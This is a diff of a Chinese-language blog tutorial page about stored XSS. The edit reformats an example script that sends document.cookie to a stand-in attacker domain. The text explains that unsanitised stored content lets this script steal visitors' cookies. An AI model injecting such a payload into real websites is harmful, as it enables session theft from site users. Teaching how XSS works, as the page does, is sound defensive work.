@@ -459,7 +459,10 @@
 <p><strong>关于如何查看后台，可以参考文章末尾给出的参考博客。</strong></p>
 <p><img src="https://i.loli.net/2020/10/28/gSYFUerZBu2EsAC.png" alt="image-20201028193602640"></p>
 <h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p><strong>存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</strong></p>
-<p>比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：&lt;script&gt;window.open(“<a href="http://www.gongji.com?param=&quot;+document.cookie)\" target="_blank" rel="noopener">www.gongji.com?param=&quot;+document.cookie)\</a></script> 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。</p>
+<p>比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&quot;www.gongji.com?param&#x3D;&quot;+document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。</p>
 <p><strong>因此存储型XSS的攻击步骤如下：</strong></p>
 <ol>
 <li>攻击者将恶意代码提交到目标网站数据库中。</li>
@@ -543,7 +546,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-28T23:51:37+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-28T23:57:14+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>最后更新于：Oct 28, 2020</p>
